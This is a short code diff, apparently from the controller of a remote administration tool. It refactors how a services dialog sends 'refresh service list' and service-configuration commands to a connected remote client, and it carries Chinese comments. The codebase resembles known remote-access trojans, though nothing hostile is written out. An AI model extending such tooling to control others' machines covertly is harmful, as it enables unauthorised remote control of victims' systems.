@@ -157,7 +157,7 @@ void CServicesDlg::OnServicesStart()
 void CServicesDlg::OnServicesReflash()
 {
 	BYTE bToken = COMMAND_SERVICELIST;   //刷新
-	m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);	
+	m_ContextObject->Send2Client(&bToken, 1);	
 }
 
 // 释放资源以后再清空
@@ -254,7 +254,7 @@ void CServicesDlg::ServicesConfig(BYTE bCmd)
 
 	memcpy(szBuffer + dwOffset, szServiceName, lstrlen(szServiceName)+1);
 
-	m_iocpServer->Send2Client(m_ContextObject, szBuffer, LocalSize(szBuffer));
+	m_ContextObject->Send2Client(szBuffer, LocalSize(szBuffer));
 	LocalFree(szBuffer);
 }
 
